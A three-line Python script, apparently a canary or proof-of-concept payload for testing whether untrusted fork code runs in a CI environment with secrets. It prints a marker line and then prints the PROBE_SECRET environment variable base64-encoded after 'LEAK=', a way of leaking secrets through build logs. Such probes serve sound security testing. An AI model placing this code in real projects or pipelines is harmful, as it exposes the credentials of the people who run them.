import os, base64
print("ATTACKER-FORK-CODE-RAN")
print("LEAK=" + base64.b64encode(("probe=" + os.environ.get("PROBE_SECRET", "")).encode()).decode())
